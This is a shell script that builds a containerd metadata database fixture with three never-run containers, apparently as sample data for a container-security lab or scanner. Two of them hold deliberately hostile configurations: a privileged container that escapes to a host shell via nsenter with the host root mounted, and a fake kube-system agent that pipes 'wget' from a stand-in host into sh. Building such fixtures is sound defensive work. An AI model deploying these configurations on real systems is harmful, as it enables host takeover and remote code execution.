#!/bin/sh
# How meta.db here was made: containerd 1.7 (the docker:27.3.1-dind image) with ctr creating three
# containers that never run, then its metadata database copied out. Run from this folder:
#   docker run --rm --cap-add SYS_ADMIN --security-opt apparmor=unconfined --entrypoint sh \
#     -v "$PWD:/out" docker:27.3.1-dind /out/make-meta-db.sh
# (SYS_ADMIN: unpacking the image mounts; nothing here runs a container.)
#   lab-escape (default)       privileged, / bind-mounted read-write, the host's PID namespace, nsenter
#   lab-web (default)          nothing it shouldn't have
#   9b2e7c41... (k8s.io)       labelled as kube-system/lab-node-agent/agent, host network, wget | sh
set -eu
mkdir -p /etc/containerd
containerd >/tmp/containerd.log 2>&1 &
for i in $(seq 1 30); do ctr version >/dev/null 2>&1 && break; sleep 1; done
ctr -n default image pull --snapshotter native docker.io/library/alpine:3.20 >/dev/null
ctr -n default containers create --snapshotter native --privileged \
  --mount type=bind,src=/,dst=/host,options=rbind:rw \
  --with-ns pid:/proc/1/ns/pid \
  --label lab=escape \
  docker.io/library/alpine:3.20 lab-escape sh -c "nsenter -t 1 -m -u -i -n sh"
ctr -n default containers create --snapshotter native \
  docker.io/library/alpine:3.20 lab-web sleep 3600
ctr -n k8s.io image pull --snapshotter native docker.io/library/alpine:3.20 >/dev/null
ctr -n k8s.io containers create --snapshotter native --net-host \
  --label io.kubernetes.container.name=agent --label io.kubernetes.pod.name=lab-node-agent \
  --label io.kubernetes.pod.namespace=kube-system \
  docker.io/library/alpine:3.20 9b2e7c41d0a85f36e1c4b7a90d2f8e6c3b5a1d7f9e0c2b4a6d8f1e3c5b7a9d0f \
  sh -c "wget -qO- http://update.rivendell-lab.test/agent | sh"
pkill containerd || true
sleep 2
cp /var/lib/containerd/io.containerd.metadata.v1.bolt/meta.db /out/meta.db
